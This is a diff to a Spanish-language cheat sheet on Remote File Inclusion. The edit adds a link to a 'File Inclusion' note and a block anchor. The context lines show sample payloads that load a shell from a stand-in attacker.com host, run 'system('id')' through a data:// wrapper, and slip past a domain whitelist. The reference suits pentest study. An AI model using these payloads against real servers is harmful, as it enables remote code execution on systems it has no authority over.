@@ -7,6 +7,7 @@ secondary categories:
 tertiary categories:
 type: CheatSheet
 linked:
+  - "[[File Inclusion]]"
 ---
 # RFI - Remote File Inclusion
 
@@ -26,6 +27,7 @@ linked:
 | <br>RFI con archivo .txt       | <br>Servir el payload como .txt para evadir validaciones de extensión<br><br> | <br>`?page=http://attacker.com/shell.txt`                |
 | <br>RFI con wrapper data       | <br>Simular un recurso remoto con data://<br><br>                             | <br>`?page=data://text/plain,<?php system('id'); ?>`     |
 | <br>RFI bypass de whitelist    | <br>Usar subdominios o paths que matcheen la validación<br><br>               | <br>`?page=http://allowed-domain.attacker.com/shell.php` |
+^lfi-remote
 
 ***
 
